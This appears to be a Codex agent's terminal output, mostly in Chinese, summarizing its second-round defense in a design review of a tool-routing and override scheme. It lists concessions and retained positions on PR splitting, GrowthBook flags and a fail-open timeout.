  ✓ Compose Round 2 defense with 12 Q&A + concession matrix
codex
Round 2 答辩已输出到 stdout。核心让步:

- **Q1/Q2**: "节省 80%" 数字高估 (实际行数相当), override 从 1 个修正为 **4 个** (Bash + read_file + edit_file + write_file)
- **Q7**: GrowthBook 从"全删"让步为 **降 P2** — 承认没有 3 个月内真实调优目标, 但保留 hook 点位
- **Q8**: GB 作为"渐进放量开关"合理, 作为"内部 threshold"不适用
- **Q10**: PR-D 合 + PR-E 未合在 **短期内 (< 3 天) 可接受**
- **Q11/Q12**: D+E 合并为 **5 PR** — 理由是耦合性, 不是防延期

**坚守立场:**
- D1: 分层混合 (4 工具 override + 15 工具 default router)
- D2: P2 interface only + metric 触发 P1
- D6: fail-open (5s timeout 后 allow)
- D3: 降 P2 而非 P0 (非全删)
tokens used
58,468
Round 2 答辩已输出到 stdout。核心让步:

- **Q1/Q2**: "节省 80%" 数字高估 (实际行数相当), override 从 1 个修正为 **4 个** (Bash + read_file + edit_file + write_file)
- **Q7**: GrowthBook 从"全删"让步为 **降 P2** — 承认没有 3 个月内真实调优目标, 但保留 hook 点位
- **Q8**: GB 作为"渐进放量开关"合理, 作为"内部 threshold"不适用
- **Q10**: PR-D 合 + PR-E 未合在 **短期内 (< 3 天) 可接受**
- **Q11/Q12**: D+E 合并为 **5 PR** — 理由是耦合性, 不是防延期

**坚守立场:**
- D1: 分层混合 (4 工具 override + 15 工具 default router)
- D2: P2 interface only + metric 触发 P1
- D6: fail-open (5s timeout 后 allow)
- D3: 降 P2 而非 P0 (非全删)
